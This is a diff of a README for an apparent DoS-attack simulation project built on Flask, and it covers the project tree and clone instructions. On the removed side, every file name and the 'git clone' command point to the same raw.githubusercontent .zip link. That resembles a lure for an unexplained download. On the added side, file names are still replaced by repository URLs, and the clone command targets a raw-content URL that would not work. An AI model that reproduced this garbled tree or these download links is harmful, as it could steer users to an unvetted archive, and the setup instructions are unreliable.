@@ -19,18 +19,18 @@ The project includes:
 
 ```plaintext
 DOS-Attack-Simulation/
-├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip                  # Main Flask server script
-├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip               # Configuration settings
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack               # Main Flask server script
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack               # Configuration settings
 ├── __pycache__/            # Python cache files
-├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip        # Project dependencies
-├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip            # Fix script for setup issues
-├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip                # Initial setup script
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack       # Project dependencies
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack            # Fix script for setup issues
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack           # Initial setup script
 ├── simulation/             # Simulation module
-│   ├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
-│   └── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip        # DOS traffic simulator
+│   ├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack
+│   └── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack   # DOS traffic simulator
 ├── templates/              # HTML templates for Flask
-│   └── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
-├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip          # Script for testing server functionality
+│   └── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack
+├── https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack       # Script for testing server functionality
 └── venv/                   # Python virtual environment
 ```
 ---
@@ -47,7 +47,7 @@ DOS-Attack-Simulation/
 
 ### 1. Clone the repository
 ```bash
-git clone https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack/main/ourie/Simulation-of-DOS-attack.zip
+git clone https://raw.githubusercontent.com/amanverma420/Simulation-of-DOS-attack
 cd Simulation-of-DOS-attack
 
 ```
